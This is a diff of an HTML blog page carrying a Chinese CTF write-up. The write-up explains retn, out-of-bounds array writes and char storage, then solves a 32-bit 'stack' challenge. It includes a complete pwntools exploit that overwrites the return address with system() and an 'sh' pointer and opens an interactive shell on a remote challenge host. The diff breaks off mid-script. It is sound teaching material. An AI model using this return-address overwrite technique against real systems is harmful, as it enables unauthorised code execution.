@@ -289,7 +289,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">3.5k</span>阅读时长: <span class="post-count reading-time">15 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">3.4k</span>阅读时长: <span class="post-count reading-time">15 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -418,58 +418,63 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h3 id="0x00-相关知识点"><a href="#0x00-相关知识点" class="headerlink" title="0x00.相关知识点"></a><font color="navy"><code>0x00.相关知识点</code></font></h3><h4 id="1-retn-指令"><a href="#1-retn-指令" class="headerlink" title="1.retn 指令"></a><font color="blue"><code>1.retn 指令</code></font></h4><p><code>格式</code>：retn</p>
+        <h3 id="font-color-navy0x00相关知识点font"><a class="markdownIt-Anchor" href="#font-color-navy0x00相关知识点font"></a> <font color="navy"><code>0x00.相关知识点</code></font></h3>
+<h4 id="font-color-blue1retn-指令font"><a class="markdownIt-Anchor" href="#font-color-blue1retn-指令font"></a> <font color="blue"><code>1.retn 指令</code></font></h4>
+<p><code>格式</code>：retn</p>
 <p><code>功能</code>：返回主程序。经常和<code>call</code>一起使用，当调用的过程结束后实现从过程返回至原调用程序的下一条指令，本指令不影响标志位</p>
-<p><code>说明</code>：由于在过程定义时，已指明其近(NEAR)或远(FAR)的属性,所以RET指令根据段内调用与段间调用,执行不同的操作  </p>
+<p><code>说明</code>：由于在过程定义时，已指明其近(NEAR)或远(FAR)的属性,所以RET指令根据段内调用与段间调用,执行不同的操作</p>
 <ul>
 <li><code>对段内调用</code>：返回时，由堆栈弹出一个字的返回地址的段内偏移量至IP</li>
 <li><code>对段外调用</code>：返回时，由堆栈弹出的第一个字为返回地址的段内偏移量，将其送入IP中，由堆栈弹出第二个字为返回地址的段基址，将其送入CS中</li>
 </ul>
 <p><code>举例</code></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面用一个简单的代码来说明一下retn的具体作用，代码如下：</p>
+<p>     下面用一个简单的代码来说明一下retn的具体作用，代码如下：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"This_is_a_function.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> s;</span><br><span class="line">        s = fun();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"s is %d\n"</span>,s);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;main和fun函数的汇编代码如下：</p>
+<p>      main和fun函数的汇编代码如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">000011a9 &lt;fun&gt;:</span><br><span class="line">   0x565561a9 &lt;+0&gt;:     push   ebp</span><br><span class="line">   0x565561aa &lt;+1&gt;:     mov    ebp,esp</span><br><span class="line">   0x565561ac &lt;+3&gt;:     push   ebx</span><br><span class="line">   0x565561ad &lt;+4&gt;:     sub    esp,0x4</span><br><span class="line">   0x565561b0 &lt;+7&gt;:     call   0x56556221 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   0x565561b5 &lt;+12&gt;:    add    eax,0x2e4b</span><br><span class="line">   0x565561ba &lt;+17&gt;:    sub    esp,0xc</span><br><span class="line">   0x565561bd &lt;+20&gt;:    lea    edx,[eax-0x1ff8]</span><br><span class="line">   0x565561c3 &lt;+26&gt;:    push   edx</span><br><span class="line">   0x565561c4 &lt;+27&gt;:    mov    ebx,eax</span><br><span class="line">   0x565561c6 &lt;+29&gt;:    call   0x56556040 &lt;puts@plt&gt;</span><br><span class="line">   0x565561cb &lt;+34&gt;:    add    esp,0x10</span><br><span class="line">   0x565561ce &lt;+37&gt;:    mov    eax,0x0</span><br><span class="line">   0x565561d3 &lt;+42&gt;:    mov    ebx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x565561d6 &lt;+45&gt;:    leave  </span><br><span class="line">   0x565561d7 &lt;+46&gt;:    ret</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">000011d8 &lt;main&gt;:</span><br><span class="line">   0x565561d8 &lt;+0&gt;:     lea    ecx,[esp+0x4]   </span><br><span class="line">   0x565561dc &lt;+4&gt;:     and    esp,0xfffffff0                                                               </span><br><span class="line">   0x565561df &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]                                                           </span><br><span class="line">   0x565561e2 &lt;+10&gt;:    push   ebp                                                                           </span><br><span class="line">   0x565561e3 &lt;+11&gt;:    mov    ebp,esp                                                                       </span><br><span class="line">   0x565561e5 &lt;+13&gt;:    push   ebx                                                                           </span><br><span class="line">   0x565561e6 &lt;+14&gt;:    push   ecx                                                                           </span><br><span class="line">   0x565561e7 &lt;+15&gt;:    sub    esp,0x10                                                                     </span><br><span class="line">   0x565561ea &lt;+18&gt;:    call   0x565560b0 &lt;__x86.get_pc_thunk.bx&gt;                                           </span><br><span class="line">   0x565561ef &lt;+23&gt;:    add    ebx,0x2e11                                                                   </span><br><span class="line">   0x565561f5 &lt;+29&gt;:    call   0x565561a9 &lt;fun&gt;                                                             </span><br><span class="line">   0x565561fa &lt;+34&gt;:    mov    DWORD PTR [ebp-0xc],eax                                                       </span><br><span class="line">   0x565561fd &lt;+37&gt;:    sub    esp,0x8                                                                       </span><br><span class="line">   0x56556200 &lt;+40&gt;:    push   DWORD PTR [ebp-0xc]                                                           </span><br><span class="line">   0x56556203 &lt;+43&gt;:    lea    eax,[ebx-0x1fe4]                                                                0x56556209 &lt;+49&gt;:    push   eax                                                                              0x5655620a &lt;+50&gt;:    call   0x56556030 &lt;printf@plt&gt;                                                       </span><br><span class="line">   0x5655620f &lt;+55&gt;:    add    esp,0x10                                                                     </span><br><span class="line">   0x56556212 &lt;+58&gt;:    mov    eax,0x0                                                                       </span><br><span class="line">   0x56556217 &lt;+63&gt;:    lea    esp,[ebp-0x8]                                                                 </span><br><span class="line">   0x5655621a &lt;+66&gt;:    pop    ecx                                                                           </span><br><span class="line">   0x5655621b &lt;+67&gt;:    pop    ebx</span><br><span class="line">   0x5655621c &lt;+68&gt;:    pop    ebp</span><br><span class="line">   0x5655621d &lt;+69&gt;:    lea    esp,[ecx-0x4]</span><br><span class="line">   0x56556220 &lt;+72&gt;:    ret</span><br></pre></td></tr></table></figure>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;观察main函数中调用fun函数时栈中的变化，如图所示：</p>
+<p>      观察main函数中调用fun函数时栈中的变化，如图所示：</p>
 <p><img src="/images/123-1.png" alt></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从上图中可以看出，在进入fun函数之后，main+34偏移处的地址<code>0x565561fa</code>被放在了栈中，这也就是我们所说的返回地址，我们将断点打到<code>0x565561d6</code>处，也就是fun函数中的leave指令的地方，我们观察寄存器和栈中的情况。由于leave指令相当于<code>movl %ebp %esp; popl %ebp</code>，具体的如下图：</p>
+<p>      从上图中可以看出，在进入fun函数之后，main+34偏移处的地址<code>0x565561fa</code>被放在了栈中，这也就是我们所说的返回地址，我们将断点打到<code>0x565561d6</code>处，也就是fun函数中的leave指令的地方，我们观察寄存器和栈中的情况。由于leave指令相当于<code>movl %ebp %esp; popl %ebp</code>，具体的如下图：</p>
 <p><img src="/images/123-2.jpg" alt></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;也就是说，<strong>在执行到 <code>ret</code> 语句的时候，寄存器<code>eip</code>指向函数的返回地址，</strong>知道这一点就可以了</p>
-<h4 id="2-数组溢出原理"><a href="#2-数组溢出原理" class="headerlink" title="2.数组溢出原理"></a><font color="blue"><code>2.数组溢出原理</code></font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果没有检查数组的输入上界，那么很容易产生溢出，在C语言中，数组的元素下标是从0开始计算的，所以，对于n个元素的数组a[n]， 遍历它的时候是a[0],a[1],…,a[n-1]，如果遍历到a[n]，数组就溢出了。下面就用一个简单的例子进行说明，代码如下：</p>
+<p>     也就是说，**在执行到 <code>ret</code> 语句的时候，寄存器<code>eip</code>指向函数的返回地址，**知道这一点就可以了</p>
+<h4 id="font-color-blue2数组溢出原理font"><a class="markdownIt-Anchor" href="#font-color-blue2数组溢出原理font"></a> <font color="blue"><code>2.数组溢出原理</code></font></h4>
+<p>      如果没有检查数组的输入上界，那么很容易产生溢出，在C语言中，数组的元素下标是从0开始计算的，所以，对于n个元素的数组a[n]， 遍历它的时候是a[0],a[1],…,a[n-1]，如果遍历到a[n]，数组就溢出了。下面就用一个简单的例子进行说明，代码如下：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">3</span>] = &#123;<span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x33</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> a; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"输入数组索引下标："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;index);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"输出数组元素：array[%d] = 0x%x\n"</span>, index, <span class="built_in">array</span>[index]); <span class="comment">//数组越界读操作</span></span><br><span class="line">    <span class="comment">//array[index] = 1 ; //数组越界写操作</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面用GDB进行调试，在执行第7行前，该程序的栈的示意图如下：</p>
+<p>      下面用GDB进行调试，在执行第7行前，该程序的栈的示意图如下：</p>
 <p><img src="/images/123-3.png" alt></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过GDB的调试，我们可以发现数组寻址的方式为：<code>ebp+eax*4-0x18</code>，其中<code>0x18</code>是数组array首地址<code>ebp-0x18</code>得来的，<code>eax</code>也就是我们要输入的下标，这里之所以是<code>eax*4</code>，是因为数组array的值是int类型，4个字节大小。</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;正常来说，我们要想输出array中的<code>0x22</code>的话，就需要我们输入下标<code>1</code>，使得<code>ebp+eax*4-0x18=0xffffd8c8+1*4-0x18=0xffffd8b4</code>，那么如果没有对输入的下标进行限制的话，那么就很有可能发生数组溢出的问题，比如这里我们可以输入下标为<code>4</code>，那么该程序会将<code>0xffffd8c8+4*4-0x18=0xffffd8c0</code>地址处的值<code>0xffffd8e0</code>打印出来，如下图所示：</p>
+<p>      通过GDB的调试，我们可以发现数组寻址的方式为：<code>ebp+eax*4-0x18</code>，其中<code>0x18</code>是数组array首地址<code>ebp-0x18</code>得来的，<code>eax</code>也就是我们要输入的下标，这里之所以是<code>eax*4</code>，是因为数组array的值是int类型，4个字节大小。</p>
+<p>      正常来说，我们要想输出array中的<code>0x22</code>的话，就需要我们输入下标<code>1</code>，使得<code>ebp+eax*4-0x18=0xffffd8c8+1*4-0x18=0xffffd8b4</code>，那么如果没有对输入的下标进行限制的话，那么就很有可能发生数组溢出的问题，比如这里我们可以输入下标为<code>4</code>，那么该程序会将<code>0xffffd8c8+4*4-0x18=0xffffd8c0</code>地址处的值<code>0xffffd8e0</code>打印出来，如下图所示：</p>
 <p><img src="/images/123-4.png" alt></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以上就是数组溢出的一个原理了，在有的程序中，我们可以利用输入数组的值来达到改变<code>eip</code>的效果，本题就是一个很好的例子。</p>
-<h4 id="3-字符类型在数组中存放的形式（字符和字符字面值）"><a href="#3-字符类型在数组中存放的形式（字符和字符字面值）" class="headerlink" title="3.字符类型在数组中存放的形式（字符和字符字面值）"></a><font color="blue"><code>3.字符类型在数组中存放的形式（字符和字符字面值）</code></font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先来问一个问题：<code>计算机为什么用二进制和十六进制</code>？<sup>[2]</sup></p>
+<p>      以上就是数组溢出的一个原理了，在有的程序中，我们可以利用输入数组的值来达到改变<code>eip</code>的效果，本题就是一个很好的例子。</p>
+<h4 id="font-color-blue3字符类型在数组中存放的形式字符和字符字面值font"><a class="markdownIt-Anchor" href="#font-color-blue3字符类型在数组中存放的形式字符和字符字面值font"></a> <font color="blue"><code>3.字符类型在数组中存放的形式（字符和字符字面值）</code></font></h4>
+<p>      首先来问一个问题：<code>计算机为什么用二进制和十六进制</code>？<sup>[2]</sup></p>
 <blockquote>
 <p>因为二值信号可以很容易地被表示、存储和传输。例如，可以表示为穿孔卡片上有洞或无洞、导线上的高电压或低电压，或者顺时针或逆时针的磁场。而由于用二进制表示法太冗长，而十进制表示法与位模式的互相转换很麻烦，替代的方法是以16为基数，即十六进制（hexadecimal）。</p>
 </blockquote>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;再来问一个问题：<code>什么是字符字面值？</code><sup>[2]</sup></p>
+<p>      再来问一个问题：<code>什么是字符字面值？</code><sup>[2]</sup></p>
 <blockquote>
-<p>字面值就是一种记号而已，比如3，100，a,c，3.14。因为我们不能修改它（你能说把3改成5吗？）所以有时候又叫它常量。比如 int a = 100；a是一个int型变量，100就是一个字面值。字面值100只能用来作右值，不能作左值。<br>C语言中字符字面值是由一对<code>单引号括起来的单个字符</code>，比如’a’、’b’。实际上字符字面值和整型字面值是一样的。编译器把字符字面值都当做整型字面值处理。比如：</p>
+<p>字面值就是一种记号而已，比如3，100，a,c，3.14。因为我们不能修改它（你能说把3改成5吗？）所以有时候又叫它常量。比如 int a = 100；a是一个int型变量，100就是一个字面值。字面值100只能用来作右值，不能作左值。<br>C语言中字符字面值是由一对<code>单引号括起来的单个字符</code>，比如’a’、‘b’。实际上字符字面值和整型字面值是一样的。编译器把字符字面值都当做整型字面值处理。比如：</p>
 <ul>
 <li>定义一个字符变量并用字符字面值来初始化：char ch = ‘a’；或者 char ch = 0x61；</li>
 <li>定义一个int型变量并用字符字面值来初始化：int a = ‘a’；也是可以的，<code>printf(&quot;%d&quot;,a);</code>输出结果为<code>97</code></li>
 </ul>
 </blockquote>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总结如下：</p>
+<p>      总结如下：</p>
 <blockquote>
 <ul>
 <li>字符型可以和整型可以相互转化，在C语言中<code>字符型就是一种整型</code>，因为在内存中存储的是二进制形式，可以被解析成字符和字符字面值两个含义；</li>
 <li>字符字面值是由单引号括起来的单个字符；</li>
 </ul>
 </blockquote>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上程序：</p>
+<p>      上程序：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> a[<span class="number">5</span>]=<span class="string">"abcd"</span>;</span><br><span class="line">	<span class="keyword">int</span> b = <span class="string">'c'</span>;</span><br><span class="line">	a[<span class="number">1</span>] = <span class="number">0x62</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(a[<span class="number">0</span>]==<span class="number">0x61</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"a[0] == %c(char) == %d(int) == 0x%x(hex)\n"</span>,a[<span class="number">0</span>],a[<span class="number">0</span>],a[<span class="number">0</span>]);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"a[1] == %c(char) == %d(int) == 0x%x(hex)\n"</span>,a[<span class="number">1</span>],a[<span class="number">1</span>],a[<span class="number">1</span>]);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"   b == %c(char) == %d(int) == 0x%x(hex)\n"</span>,b,b,b);</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"!="</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;输出的结果为：</p>
+<p>      输出的结果为：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a[0] == a(char) == 97(int) == 0x61(hex)</span><br><span class="line">a[1] == b(char) == 98(int) == 0x62(hex)</span><br><span class="line">   b == c(char) == 99(int) == 0x63(hex)</span><br><span class="line">Press any key to continue</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>从上面的代码运行结果中可以看出，对于char类型输入0x62，这个值被当作字符面值相当于给a[1]输入了字符’b’，在内存中以二进制<code>01100010</code>的形式进行存储着</p>
 </blockquote>
-<h3 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a><font color="navy"><code>0x01 题目分析</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file stack </span><br><span class="line">stack: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d39da4953c662091eab7f33f7dc818f1d280cb12, not stripped</span><br></pre></td></tr></table></figure>
+<h3 id="font-color-navy0x01-题目分析font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-题目分析font"></a> <font color="navy"><code>0x01 题目分析</code></font></h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file stack </span><br><span class="line">stack: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d39da4953c662091eab7f33f7dc818f1d280cb12, not stripped</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>该文件是一个32位的ELF文件</p>
 </blockquote>
@@ -494,11 +499,11 @@ height:50vh;
 </ul>
 <p>那么下面我们来看看看怎么使得返回地址为system的地址，如下图：</p>
 </blockquote>
-<p><img src="/images/123-7.png" alt></p>
+<p><img src="/images/123-7.jpg" alt></p>
 <blockquote>
 <p>同样上图也包含了很多信息：</p>
 <ul>
-<li>因为是小端存储的方式，而system函数的地址为<code>0x08048450</code>，所以连续存储了<code>0x50</code>、<code>0x84</code>、<code>0x04</code>、<code>0x08</code></li>
+<li>因为是小端存储的方式，而system函数的地址为<code>0x08048450</code>，所以从低地址到高地址连续存储了<code>0x50</code>、<code>0x84</code>、<code>0x04</code>、<code>0x08</code></li>
 <li>要明白得到<code>0x08048450</code>的结果是图中所示求得的，那么两种方式是否有联系呢？以后再探讨</li>
 </ul>
 </blockquote>
@@ -514,7 +519,8 @@ height:50vh;
 <blockquote>
 <p>从上图中可以看出我们已经成功地将system和sh的地址写入到我们想写入的地方</p>
 </blockquote>
-<h3 id="0x02-解题步骤"><a href="#0x02-解题步骤" class="headerlink" title="0x02 解题步骤"></a><font color="navy"><code>0x02 解题步骤</code></font></h3><blockquote>
+<h3 id="font-color-navy0x02-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-解题步骤font"></a> <font color="navy"><code>0x02 解题步骤</code></font></h3>
+<blockquote>
 <p>根据上文的分析，我们找到system、sh的地址和v13相对于返回地址的偏移：</p>
 </blockquote>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">retn_esp = <span class="number">0xffffd8bc</span></span><br><span class="line">ebp = <span class="number">0xffffd8a8</span></span><br><span class="line">v13 = ebp - <span class="number">0x70</span></span><br><span class="line">offset = retn_esp - ebp + <span class="number">0x70</span></span><br><span class="line">print(<span class="string">"[*] offset is"</span>,offset,<span class="string">"("</span>,hex(offset),<span class="string">")"</span>)</span><br><span class="line">system_addr = [<span class="number">0x50</span>,<span class="number">0x84</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br><span class="line">sh = [<span class="number">0x87</span>,<span class="number">0x89</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br></pre></td></tr></table></figure>
@@ -534,11 +540,13 @@ height:50vh;
 <p>结束程序运行，并与系统进行交互</p>
 </blockquote>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)	</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="0x03-EXP"><a href="#0x03-EXP" class="headerlink" title="0x03 EXP"></a><font color="navy"><code>0x03 EXP</code></font></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">"debug"</span>,arch=<span class="string">"i386"</span>,os=<span class="string">"linux"</span>,endian=<span class="string">"little"</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">35029</span>)</span><br><span class="line">retn_esp = <span class="number">0xffffd8bc</span></span><br><span class="line">ebp = <span class="number">0xffffd8a8</span></span><br><span class="line">v13 = ebp - <span class="number">0x70</span></span><br><span class="line">offset = retn_esp - ebp + <span class="number">0x70</span></span><br><span class="line">print(<span class="string">"[*] offset is"</span>,offset,<span class="string">"("</span>,hex(offset),<span class="string">")"</span>)</span><br><span class="line">system_addr = [<span class="number">0x50</span>,<span class="number">0x84</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br><span class="line">sh = [<span class="number">0x87</span>,<span class="number">0x89</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">	r.sendlineafter(<span class="string">"How many numbers you have:\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">"Give me your numbers\n"</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change_addr</span><span class="params">(offset,addr_part)</span>:</span></span><br><span class="line">	r.sendlineafter(<span class="string">"5. exit\n"</span>,<span class="string">"3"</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">"which number to change:\n"</span>,str(offset))</span><br><span class="line">	r.sendlineafter(<span class="string">"new number:\n"</span>,str(addr_part))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	<span class="comment"># 开始</span></span><br><span class="line">	start()</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># 向返回地址写入system地址</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">		Change_addr(offset+i,system_addr[i])</span><br><span class="line">	print(<span class="string">"[*] offset is"</span>,offset)</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># 向system的参数位置写入sh地址</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">		Change_addr(offset+j+<span class="number">8</span>,sh[j])</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 结束</span></span><br><span class="line">	r.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line">	r.sendline(<span class="string">"5"</span>)	</span><br><span class="line">	r.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a><font color="navy"><code>0x04 Reference</code></font></h3><p>[1] <a href="https://www.zhihu.com/question/23440081" target="_blank" rel="noopener">为什么C语言中数组下标越界不报错？</a></p>
+<h3 id="font-color-navy0x03-expfont"><a class="markdownIt-Anchor" href="#font-color-navy0x03-expfont"></a> <font color="navy"><code>0x03 EXP</code></font></h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">"debug"</span>,arch=<span class="string">"i386"</span>,os=<span class="string">"linux"</span>,endian=<span class="string">"little"</span>)</span><br><span class="line"></span><br><span class="line">r = 